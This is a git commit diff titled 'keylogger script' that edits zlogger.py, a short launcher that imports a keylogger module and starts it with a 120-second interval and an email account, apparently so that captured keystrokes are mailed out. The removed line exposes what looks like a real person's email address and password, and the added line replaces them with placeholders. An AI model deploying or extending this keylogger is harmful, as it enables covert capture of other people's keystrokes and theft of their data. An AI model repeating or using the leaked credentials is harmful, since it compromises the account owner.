4f233e306e5ffa820709af7e16f1887ac1475516
Tarrun <52660661+tarrun99@users.noreply.github.com>
2022-06-08 11:15:27 -0400

    keylogger script

--- zlogger.py
+++ zlogger.py
@@ -2,5 +2,5 @@
 
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "121910302010@gitam.in", "$aiTarrun2521#")
+my_keylogger = keylogger.Keylogger(120, "email_address", "password")    #Enter the email address and password of your email_account 
 my_keylogger.start()
